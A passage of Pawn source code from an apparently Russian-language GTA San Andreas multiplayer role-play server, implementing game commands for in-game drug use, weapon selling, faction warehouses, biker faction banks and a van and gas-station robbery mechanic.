	format(YCMDstr,sizeof(YCMDstr), " %s употребил(a) наркотик",PlayerInfo[playerid][pName]);
	ProxDetector(10.0, playerid,YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	PlayerInfo[playerid][pAddiction] += 4*params[0];
	SendMes(playerid, -1, " (( Осталось: %i грамм ))", PlayerInfo[playerid][pDrugs]);
	if(startaddiction[playerid] == 1)
	{
		startaddiction[playerid] = 0;
		ApplyAnimation(playerid,"SMOKING","M_smk_drag",4.1,0,0,0,0,0,1);
		PlayerInfo[playerid][pNarcoLomka] = 0;
	}
	printf("Игрок %s употребил наркотики", Name(playerid));
	return true;
}
CMD:gunlist(playerid, params[])
{
	if(!IsAGang(playerid) && !IsABiker(playerid)) return true;
	ShowPlayerDialogEx(playerid,8321,DIALOG_STYLE_MSGBOX, "Cписок оружия", "\tИмя\t\t материалов за патрон\t\t материалов за обойму\n__________________________________________________________________\n\n[ID: 23] Sdpistol\t\t1м\t\t\t\t15м\n[ID: 24] Deagle\t\t\t3м\t\t\t\t21м\n[ID: 25] Shotgun\t\t3м\t\t\t\t-\n[ID: 29] SMG\t\t\t2м\t\t\t\t60м\n[ID: 30] AK-47\t\t\t3м\t\t\t\t90м\n[ID: 31] M4A1\t\t\t3м\t\t\t\t150м\n[ID: 33] Rifle\t\t\t5м\t\t\t\t-", "Закрыть", "");
	return true;
}
CMD:bsellgun(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	if(!IsABiker(playerid)) return true;
	new gunname[22];
	if(sscanf(params, "s[18]ddu",gunname,params[0],params[1],params[2]))
	{
		SCM(playerid, -1," Введите: /bsellgun [название оружия] [патроны] [цена] [playerid]");
		SCM(playerid, -1," Введите: /gunlist - название оружия и расходы материалов");
		return true;
	}
	if(params[1] > 50000 || params[1] < 4 || params[0] < 0) return SCM(playerid,COLOR_GREY," Неверная цена/патроны");
	if(!ProxDetectorS(5.0, playerid, params[2])) return SCM(playerid, COLOR_GREY, "Человек должен быть рядом с вами");
	if(strcmp(gunname,"sdpistol", true) == 0) SetPVarInt(params[2],"Sell_Gun",23), SetPVarInt(params[2],"Sell_GunMats",1);
	else if(strcmp(gunname,"deagle", true) == 0) SetPVarInt(params[2],"Sell_Gun",24), SetPVarInt(params[2],"Sell_GunMats",3);
	else if(strcmp(gunname,"shotgun", true) == 0) SetPVarInt(params[2],"Sell_Gun",25), SetPVarInt(params[2],"Sell_GunMats",3);
	else if(strcmp(gunname,"smg", true) == 0) SetPVarInt(params[2],"Sell_Gun",29), SetPVarInt(params[2],"Sell_GunMats",2);
	else if(strcmp(gunname,"ak47", true) == 0) SetPVarInt(params[2],"Sell_Gun",30), SetPVarInt(params[2],"Sell_GunMats",3);
	else if(strcmp(gunname,"m4", true) == 0) SetPVarInt(params[2],"Sell_Gun",31), SetPVarInt(params[2],"Sell_GunMats",3);
	else if(strcmp(gunname,"rifle", true) == 0) SetPVarInt(params[2],"Sell_Gun",33), SetPVarInt(params[2],"Sell_GunMats",5);
	else return SCM(playerid,COLOR_GREY," Неизвестное оружие");
	if(PlayerInfo[playerid][pMats] < (GetPVarInt(playerid,"Sell_GunMats")*params[0])) return SCM(playerid, COLOR_GREY, " У вас недостаточно материалов!");
	if(playerid == params[2])
	{
		GiveWeapon(playerid,GetPVarInt(params[2],"Sell_Gun"),params[0]);
		PlayerInfo[playerid][pMats] -= (GetPVarInt(playerid,"Sell_GunMats")*params[0]);
		format(YCMDstr, sizeof(YCMDstr), " %s сделал себе оружие из материалов",PlayerInfo[playerid][pName]);
		ProxDetector(10.0, playerid,YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		return true;
	}
	SetPVarInt(params[2],"Sell_GunId",playerid);
	SetPVarInt(params[2],"Sell_GunAmmo",params[0]);
	SetPVarInt(params[2],"Sell_GunPrice",params[1]);
	SetPVarInt(params[2],"Sell_GunMats",GetPVarInt(params[2],"Sell_GunMats")*params[0]);
	SendMes(params[2],COLOR_BLUE, " %s предлагает вам купить оружие %s. Патроны: %i",PlayerInfo[playerid][pName],gunname,params[0]);
	SCM(params[2],COLOR_BLUE," Введите: /accept gun для покупки оружия");
	SCM(playerid, 0x6495EDFF, " Вы предложили купить оружие!");
	return true;
}
CMD:sellgun(playerid, params[])
{
	if(!IsAGang(playerid)) return SCM(playerid,COLOR_GREY," Вам недоступна данная команда!");
	new gunname[22];
	if(sscanf(params, "s[18]ddu",gunname,params[0],params[1],params[2]))
	{
		SCM(playerid, -1," Введите: /sellgun [название оружия] [патроны] [цена] [playerid]");
		SCM(playerid, -1," Введите: /gunlist - название оружия и расходы материалов");
		return true;
	}
	if(params[1] > 50000 || params[1] < 4 || params[0] < 0) return SCM(playerid,COLOR_GREY," Неверная цена/патроны");
	if(!ProxDetectorS(5.0, playerid, params[2])) return SCM(playerid, COLOR_GREY, "Человек должен быть рядом с вами");
	if(strcmp(gunname,"sdpistol", true) == 0) SetPVarInt(params[2],"Sell_Gun",23), SetPVarInt(params[2],"Sell_GunMats",1);
	else if(strcmp(gunname,"deagle", true) == 0) SetPVarInt(params[2],"Sell_Gun",24), SetPVarInt(params[2],"Sell_GunMats",3);
	else if(strcmp(gunname,"shotgun", true) == 0) SetPVarInt(params[2],"Sell_Gun",25), SetPVarInt(params[2],"Sell_GunMats",3);
	else if(strcmp(gunname,"smg", true) == 0) SetPVarInt(params[2],"Sell_Gun",29), SetPVarInt(params[2],"Sell_GunMats",2);
	else if(strcmp(gunname,"ak47", true) == 0) SetPVarInt(params[2],"Sell_Gun",30), SetPVarInt(params[2],"Sell_GunMats",3);
	else if(strcmp(gunname,"m4", true) == 0) SetPVarInt(params[2],"Sell_Gun",31), SetPVarInt(params[2],"Sell_GunMats",3);
	else if(strcmp(gunname,"rifle", true) == 0) SetPVarInt(params[2],"Sell_Gun",33), SetPVarInt(params[2],"Sell_GunMats",5);
	else return SCM(playerid,COLOR_GREY," Неизвестное оружие");
	if(PlayerInfo[playerid][pMats] < (GetPVarInt(playerid,"Sell_GunMats")*params[0])) return SCM(playerid, COLOR_GREY, " У вас недостаточно материалов!");
	for(new idx = 1; idx <= TOTALGZ; idx++)
	{
		//if(PlayerToKvadrat(playerid,GZInfo[idx][gCoords][0x0], GZInfo[idx][gCoords][0x1],GZInfo[idx][gCoords][0x2],GZInfo[idx][gCoords][0x3]) && PlayerInfo[playerid][pMember] == GZInfo[idx][gFrakVlad])
		//{
			if(playerid == params[2])
			{
				if(booston == 0) GiveWeapon(playerid,GetPVarInt(params[2],"Sell_Gun"),params[0]);
				else if(booston == 1) GiveWeapon(playerid,GetPVarInt(params[2],"Sell_Gun"),params[0]*3);
				PlayerInfo[playerid][pMats] -= (GetPVarInt(playerid,"Sell_GunMats")*params[0]);
				format(YCMDstr, sizeof(YCMDstr), " %s сделал себе оружие из материалов",PlayerInfo[playerid][pName]);
				ProxDetector(10.0, playerid,YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				SendMes(playerid, -1, " (( У вас осталось %i материалов с собой ))", PlayerInfo[playerid][pMats]);
				return true;
			}
			SetPVarInt(params[2],"Sell_GunId",playerid);
			SetPVarInt(params[2],"Sell_GunAmmo",params[0]);
			SetPVarInt(params[2],"Sell_GunPrice",params[1]);
			SetPVarInt(params[2],"Sell_GunMats",GetPVarInt(params[2],"Sell_GunMats")*params[0]);
			SendMes(params[2],COLOR_BLUE, " %s предлагает вам %s. Патронов: %i. Цена: %i вирт",PlayerInfo[playerid][pName],gunname,params[0],params[1]);
			SCM(params[2],COLOR_BLUE," Что бы принять введите (/ac)cept gun");
			SCM(playerid, 0x6495EDFF, " Вы предложили купить оружие!");
			break;
		//}
	}
	return true;
}
CMD:getgun(playerid, params[])
{
	switch(PlayerInfo[playerid][pMember])
	{
	case 5:
		{
			if(PlayerToPoint(5.0,playerid,1258.4004,-791.0316,1084.0078))
			{
				if(sscanf(params, "u",params[0]))
				{
					if(PlayerInfo[playerid][pRank] < 3)return SCM(playerid,COLOR_GRAD1, " Оружие можно взять с 3 ранга!");
					if(wareLcnLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
					ShowPlayerDialogEx(playerid, 2014, DIALOG_STYLE_LIST, "Взять оружие со склада", listitems, "Выбрать", "Отмена");
					getgunsid[playerid] = playerid;
					SCM(playerid,-1," Вы можете использовать:{00BF00} /getgun [ид игрока] {ffffff},чтобы выдать оружие другим членам организации");
				}
				else
				{
					if(PlayerInfo[params[0]][pMember] != PlayerInfo[playerid][pMember]) return SCM(playerid,COLOR_GREY,"Игрок не состоит в вашей организации");
					if(wareLcnLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					if(PlayerInfo[playerid][pRank] <= 5)return SCM(playerid,COLOR_GRAD1, "Оружие можно выдать с 6 ранга!");
					new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
					ShowPlayerDialogEx(playerid, 2014, DIALOG_STYLE_LIST, "Взять оружие со склада", listitems, "Выбрать", "Отмена");
					getgunsid[playerid] = params[0];
				}
			}
		}
	case 6:
		{
			if(PlayerToPoint(5.0,playerid,1258.4004,-791.0316,1084.0078))
			{
				if(sscanf(params, "u",params[0]))
				{
					if(PlayerInfo[playerid][pRank] < 3) return SCM(playerid,COLOR_GRAD1, "Оружие можно взять с 3 ранга!");
					if(wareYakuzaLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
					ShowPlayerDialogEx(playerid, 2013, DIALOG_STYLE_LIST, "Взять оружие со склада Yakuza", listitems, "Выбрать", "Отмена");
					getgunsid[playerid] = playerid;
					SCM(playerid,-1," Вы можете использовать:{00BF00} /getgun [ид игрока] {ffffff},чтобы выдать оружие другим членам организации");
				}
				else
				{
					if(PlayerInfo[params[0]][pMember] != PlayerInfo[playerid][pMember]) return SCM(playerid,COLOR_GREY,"Игрок не состоит в вашей организации");
					if(wareYakuzaLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					if(PlayerInfo[playerid][pRank] <= 5) return SCM(playerid,COLOR_GRAD1, "Оружие можно выдать с 6 ранга!");
					new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
					ShowPlayerDialogEx(playerid, 2013, DIALOG_STYLE_LIST, "Взять оружие со склада Yakuza", listitems, "Выбрать", "Отмена");
					getgunsid[playerid] = params[0];
				}
			}
		}
	case 14:
		{
			if(PlayerToPoint(5.0,playerid,1258.4004,-791.0316,1084.0078))
			{
				if(sscanf(params, "u",params[0]))
				{
					if(PlayerInfo[playerid][pRank] < 3)return SCM(playerid,COLOR_GRAD1, "Оружие можно взять с 3 ранга!");
					if(wareRmLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
					ShowPlayerDialogEx(playerid, 2015, DIALOG_STYLE_LIST, "Взять оружие со склада Russian Mafia", listitems, "Выбрать", "Отмена");
					getgunsid[playerid] = playerid;
					SCM(playerid,-1," Вы можете использовать:{00BF00} /getgun [ид игрока] {ffffff},чтобы выдать оружие другим членам организации");
				}
				else
				{
					if(PlayerInfo[params[0]][pMember] != PlayerInfo[playerid][pMember]) return SCM(playerid,COLOR_GREY,"Игрок не состоит в вашей организации");
					if(wareRmLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					if(PlayerInfo[playerid][pRank] < 3)return SCM(playerid,COLOR_GRAD1, "Оружие можно выдать с 6 ранга!");
					new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
					ShowPlayerDialogEx(playerid, 2015, DIALOG_STYLE_LIST, "Взять оружие со склада Russian Mafia", listitems, "Выбрать", "Отмена");
					getgunsid[playerid] = params[0];
				}
			}
		}
	case 24:
		{
			if(PlayerToPoint(5.0,playerid,496.7966,-75.8150,998.7578))
			{
				if(PlayerInfo[playerid][pRank] < 2) return SCM(playerid,COLOR_GRAD1, "Оружие можно взять с 2 ранга!");
				if(wareHAMLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
				new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
				ShowPlayerDialogEx(playerid, 2017, DIALOG_STYLE_LIST, "Взять оружие со склада Hell's Angels MC", listitems, "Выбрать", "Отмена");
				getgunsid[playerid] = playerid;
			}
		}
	case 26:
		{
			if(PlayerToPoint(5.0,playerid,496.7966,-75.8150,998.7578))
			{
				if(PlayerInfo[playerid][pRank] < 2)return SCM(playerid,COLOR_GRAD1, "Оружие можно взять с 2 ранга!");
				if(warePMCLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
				new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
				ShowPlayerDialogEx(playerid, 2019, DIALOG_STYLE_LIST, "Взять оружие со склада Warlocks MC", listitems, "Выбрать", "Отмена");
				getgunsid[playerid] = playerid;
			}
		}
	case 29:
		{
			if(PlayerToPoint(5.0,playerid,496.7966,-75.8150,998.7578))
			{
				if(PlayerInfo[playerid][pRank] < 2)return SCM(playerid,COLOR_GRAD1, "Оружие можно взять с 2 ранга!");
				if(wareWCMLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
				new listitems[] = " [1] Deagle\t[70 материалов/50 патронов]\n [2] Shotgun\t[50 материалов/15 патронов]\n [3] Rifle\t[100 материалов/10 патронов]\n [4] M4\t\t[500 материалов/100 патронов]\n [5] AK-47\t[500 материалов/100 патронов]\n [6] MP5\t[400 материалов/200 патронов]\n [7] SDPistol\t[100 материалов/100 патронов])";
				ShowPlayerDialogEx(playerid, 2022, DIALOG_STYLE_LIST, "Взять оружие со склада Pagans MC", listitems, "Выбрать", "Отмена");
				getgunsid[playerid] = playerid;
			}
		}
	}
	return true;
}
CMD:bbank(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	if(PlayerInfo[playerid][pMember] == 24 || PlayerInfo[playerid][pMember] == 26 || PlayerInfo[playerid][pMember] == 29)
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /bbank [количество]");
	if(PlayerInfo[playerid][pCash] < params[0]) { SCM(playerid, COLOR_GREY, " У вас нет столько денег!"); return true; }
	if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
	switch(PlayerInfo[playerid][pMember])
	{
	case 24:
		{
			FracBank[0][fHamc] += params[0];
			PlayerInfo[playerid][pCash] -= params[0];
			format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк Hell's Angels MC: %i вирт", params[0]);
			SCM(playerid, COLOR_BLUE, YCMDstr);
		}
	case 26:
		{
			FracBank[0][fWmc] += params[0];
			PlayerInfo[playerid][pCash] -= params[0];
			format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк Warlocks MC: %i вирт",params[0]);
			SCM(playerid, COLOR_BLUE, YCMDstr);
		}
	case 29:
		{
			FracBank[0][fPmc] += params[0];
			PlayerInfo[playerid][pCash] -= params[0];
			format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк Pagans MC: %i вирт", params[0]);
			SCM(playerid, COLOR_BLUE, YCMDstr);
		}
	}
	return true;
}
CMD:bwithdraw(playerid, params[])
{
	if(PlayerInfo[playerid][pLeader] == 23 || PlayerInfo[playerid][pLeader] == 24 || PlayerInfo[playerid][pLeader] == 25 || PlayerInfo[playerid][pLeader] == 26 || PlayerInfo[playerid][pLeader] == 27 || PlayerInfo[playerid][pLeader] == 28 || PlayerInfo[playerid][pLeader] == 29 || PlayerInfo[playerid][pLeader] == 30 || PlayerInfo[playerid][pLeader] == 31 || PlayerInfo[playerid][pLeader] == 32 )
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /bwithdraw [количество]");
	if(PlayerInfo[playerid][pMember] == 24 && PlayerInfo[playerid][pRank] == 9)
	{
		if(FracBank[0][fHamc] == 0) { SCM(playerid, COLOR_GREY, "В банке Hell's Angels MC нет денег"); return true; }
		if(FracBank[0][fHamc] < params[0]) { SCM(playerid, COLOR_GREY, "В банке Hell's Angels MC нет столько денег"); return true; }
		if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
		FracBank[0][fHamc] -= params[0];
		PlayerInfo[playerid][pCash] +=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка Hell's Angels MC: %i вирт",params[0]);
		SCM(playerid, COLOR_BLUE, YCMDstr);
		printf("Игрок %s снял со счёта Hell's Angels MC %i вирт", PlayerInfo[playerid][pName], params[0]);
	}
	else if(PlayerInfo[playerid][pMember] == 26 && PlayerInfo[playerid][pRank] == 9)
	{
		if(FracBank[0][fWmc] == 0) { SCM(playerid, COLOR_GREY, "В банке Highwayman MC нет денег"); return true; }
		if(FracBank[0][fWmc] < params[0]) { SCM(playerid, COLOR_GREY, "В банке Highwayman MC нет столько денег"); return true; }
		if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
		FracBank[0][fWmc] -= params[0];
		PlayerInfo[playerid][pCash] +=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка Highwayman MC: %i вирт", params[0]);
		SCM(playerid, COLOR_BLUE, YCMDstr);
		printf("Игрок %s снял со счёта Warlocks MC %i вирт", PlayerInfo[playerid][pName], params[0]);
	}
	else if(PlayerInfo[playerid][pMember] == 29 && PlayerInfo[playerid][pRank] == 9)
	{
		if(FracBank[0][fPmc] == 0) { SCM(playerid, COLOR_GREY, "В банке Pagans MC нет денег"); return true; }
		if(FracBank[0][fPmc] < params[0]) { SCM(playerid, COLOR_GREY, "В банке Pagans MC нет столько денег"); return true; }
		if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
		FracBank[0][fPmc] -= params[0];
		PlayerInfo[playerid][pCash] +=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка Pagans MC: %i вирт", params[0]);
		SCM(playerid, COLOR_BLUE, YCMDstr);
		printf("Игрок %s снял со счёта Pagans MC %i вирт", PlayerInfo[playerid][pName], params[0]);
	}
	return true;
}
CMD:bbalance(playerid, params[])
{
	switch(PlayerInfo[playerid][pMember])
	{
	case 24:
		{
			format(YCMDstr, sizeof(YCMDstr), " В банке Hell's Angels MC: %i вирт", FracBank[0][fHamc]);
			SCM(playerid, COLOR_BLUE, YCMDstr);
			return true;
		}
	case 26:
		{
			format(YCMDstr, sizeof(YCMDstr), " В банке Warlocks MC: %i вирт", FracBank[0][fWmc]);
			SCM(playerid, COLOR_BLUE, YCMDstr);
			return true;
		}
	case 29:
		{
			format(YCMDstr, sizeof(YCMDstr), " В банке Pagans MC: %i вирт", FracBank[0][fPmc]);
			SCM(playerid, COLOR_BLUE, YCMDstr);
			return true;
		}
	default: SCM(playerid,COLOR_GREY," Вам недоступна данная команда");
	}
	return true;
}
CMD:warehouse(playerid, params[])
{
	switch(PlayerInfo[playerid][pMember])
	{
	case 1:
		{
			format(string, 128, " На складе Police LS %i/100000 материалов", lspdmatbi);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 2:
		{
			format(string, 128, " На складе FBI %i/100000 материалов", fbimats);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 3:
		{
			format(string, 128, " На военном складе SF: %i материалов", armmatsf);
			SCM(playerid, COLOR_BLUE, string);
			format(string, 128, " На военном складе LS: %i материалов", lsamatbi);
			SCM(playerid, 0x66FBA6FF, string);
			return true;
		}
	case 5:
		{
			if(wareLcnLock)
			format(string, 128, " На складе LCN %i/100000 материалов {FF0000}Склад закрыт", lcnmats);
			else
			format(string, 128, " На складе LCN %i/100000 материалов {00FF00}Склад закрыт", lcnmats);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 6:
		{
		    if(wareYakuzaLock)
   			format(string, 128, " На складе Yakuza %i/100000 материалов {FF0000}Склад закрыт", yakuzamats);
   			else
   			format(string, 128, " На складе Yakuza %i/100000 материалов {00FF00}Склад открыт", yakuzamats);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 10:
		{
			format(string, 128, " На складе SFPD %i/100000 материалов", sfpdmats);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 12:
		{
		    if(wareBallasLock)
   			format(string, 128, " На складе Ballas %i/100000 материалов {FF0000}Склад закрыт", ballasmatbi);
   			else
   			format(string, 128, " На складе Ballas %i/100000 материалов {00FF00}Склад открыт", ballasmatbi);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 13:
		{
		    if(wareVagosLock)
			format(string, 128, " На складе Vagos %i/100000 материалов {FF0000}Склад закрыт", vagosmatbi);
			else
			format(string, 128, " На складе Vagos %i/100000 материалов {00FF00}Склад открыт", vagosmatbi);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 14:
		{
		    if(wareRmLock)
			format(string, 128, " На складе Russian Mafia %i/100000 материалов {FF0000}Склад закрыт", rmmats);
			else
			format(string, 128, " На складе Russian Mafia %i/100000 материалов {00FF00}Склад открыт", rmmats);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 15:
		{
		    if(wareGrooveLock)
			format(string, 128, " На складе Grove %i/100000 материалов {FF0000}Склад закрыт", groovmatbi);
			else
			format(string, 128, " На складе Grove %i/100000 материалов {00FF00}Склад открыт", groovmatbi);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 17:
		{
		    if(wareAztecLock)
			format(string, 128, " На складе Aztec %i/100000 материалов {FF0000}Склад закрыт", aztekmatbi);
			else
			format(string, 128, " На складе Aztec %i/100000 материалов {00FF00}Склад открыт", aztekmatbi);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 18:
		{
		    if(wareRifaLock)
			format(string, 128, " На складе Rifa %i/100000 материалов {FF0000}Склад закрыт", rifamatbi);
			else
			format(string, 128, " На складе Rifa %i/100000 материалов {00FF00}Склад открыт", rifamatbi);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 19:
		{
			format(string, 128, " На главном складе: %i материалов", armmatbi);
			SCM(playerid, COLOR_BLUE, string);
			format(string, 128, "На складе LSA: %i материалов", lsamatbi);
			SCM(playerid, 0x66FBA6FF, string);
		}
	case 21:
		{
			format(string, 128, " На складе LVPD %i/100000 материалов", lvpdmats);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 24:
		{
			if(wareHAMLock)
			format(string, 128, " На складе Hell's Angels MC %i/100000 материалов {FF0000}Склад закрыт", hamcmatbi);
			else
			format(string, 128, " На складе Hell's Angels MC %i/100000 материалов {00FF00}Склад открыт", hamcmatbi);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 26:
		{
		    if(wareWCMLock)
			format(string, 128, " На складе Warlocks MC %i/100000 материалов {FF0000}Склад закрыт", wmcmatbi);
			else
			format(string, 128, " На складе Warlocks MC %i/100000 материалов {00FF00}Склад открыт", wmcmatbi);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 29:
		{
		    if(warePMCLock)
			format(string, 128, " На складе Pagans MC %i/100000 материалов {FF0000}Склад закрыт", pmcmatbi);
			else
			format(string, 128, " На складе Pagans MC %i/100000 материалов {00FF00}Склад открыт", pmcmatbi);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	}
	return true;
}
stock GetCoordBootVehicle(vehicleid, &Float:x, &Float:y, &Float:z)
{
    new Float:angle,Float:distance;
    GetVehicleModelInfo(GetVehicleModel(vehicleid), 1, x, distance, z);
    distance = distance/2 + 0.1;
	GetVehiclePos(vehicleid, x, y, z);
    GetVehicleZAngle(vehicleid, angle);
    x += (distance * floatsin(-angle+180, degrees));
    y += (distance * floatcos(-angle+180, degrees));
    return 1;
}
stock IsAZapravka(zpid)
{
	switch(zpid)
	{
	    case 20, 21, 27..34, 36, 38..45: return true;
	    default: return false;
	}
	return false;
}
CMD:empty(playerid, params[])
{
	if(!IsABiker(playerid)) return SCM(playerid, COLOR_GREY, " Вам не доступна эта функция!");
	if(PlayerInfo[playerid][pRank] < 3) return SCM(playerid, COLOR_GREY, " Доступно с 3 ранга!");
	new number_of_bikers;
	foreach(i)
	{
        if(ProxDetectorS(10.0, playerid, i) && !IsPlayerInAnyVehicle(i) && PlayerInfo[i][pMember] == PlayerInfo[playerid][pMember]) number_of_bikers++;
	}
	if(number_of_bikers < 2) return SCM(playerid, COLOR_GREY, " Ограбить можно только когда вас не менее 2 человек");
	new carRob = -1;
	for(new carid = 0; carid < MAX_VEHICLES; carid++)
	{
        switch(PlayerInfo[playerid][pMember])
		{
		    case 24:
		    {
		        if(carid == hamccar[10])
		        {
		            RobbingBiker[bikerCar] = carid;
		        }
		    }
			case 26:
			{
			    if(carid == wmccar[10])
		        {
		            RobbingBiker[bikerCar] = carid;
		        }
			}
			case 29:
			{
			    if(carid == pmccar[10])
		        {
		            RobbingBiker[bikerCar] = carid;
		        }
			}
		}
		if(!IsAGunsCar(carid)) continue;
		if(!IsPlayerNearVehicle(playerid, carid, 10.0)) continue;
		if(IsVehicleOccupied(carid) != -1) continue;
		carRob = carid;
	}
	if(RobbingBiker[bikerCar] <= 0) return SCM(playerid, COLOR_GREY, " Рядом нет вашего фургона");
	if(carRob != -1)
	{
		if(RobbingBiker[pickup] != 0) return SCM(playerid, COLOR_GREY, " Сейчас нельзя!");
	 	new Float:x1, Float:y1, Float:z1;
		GetCoordBootVehicle(carRob, x1, y1, z1);
		RobbingBiker[pickup] = CreateDynamicPickup(2969, 1, x1, y1, z1);
		RobbingBiker[robCar] = carRob;
		RobbingBiker[robType] = 1;
		format(string, sizeof(string), "Кол-во груза\n%i", MatHaul[RobbingBiker[robCar]-gunscar[0]][mLoad]);
		Rob3DText = CreateDynamic3DTextLabel(string, 0xEDEA9FAA, x1, y1, z1, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1, -1, 100.0);
	}
	else
	{
	    for(new b = 1; b <= TotalBizz; b++)
		{
			if(PlayerToPoint(3, playerid,BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]))
			{
				if(IsAZapravka(BizzInfo[b][bID]))
				{
				    if(BikerRobbedBizz[BizzInfo[b][bID]]) return SCM(playerid, COLOR_GREY, " Эту заправку уже грабили сегодня!");
				    if((BizzInfo[b][bProducts]-2000) < 0) return SCM(playerid, COLOR_GREY, " На заправке не достаточно продуктов!");
				    if(RobbingBiker[pickup] != 0) return SCM(playerid, COLOR_GREY, " Сейчас нельзя!");
				    BikerRobbedBizz[BizzInfo[b][bID]] = true;
					RobbingBiker[pickup] = CreateDynamicPickup(1650, 1, BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]);
				    RobbingBiker[robType] = 2;
				    BizzInfo[b][bProducts] -= 2000;
				    RobbingBiker[bresult] = 2000;
				    format(string, sizeof(string), "Кол-во груза\n%i", RobbingBiker[bresult]);
					Rob3DText = CreateDynamic3DTextLabel(string, 0xEDEA9FAA, BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]+5.0, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1, -1, 100.0);
				}
			}
		}
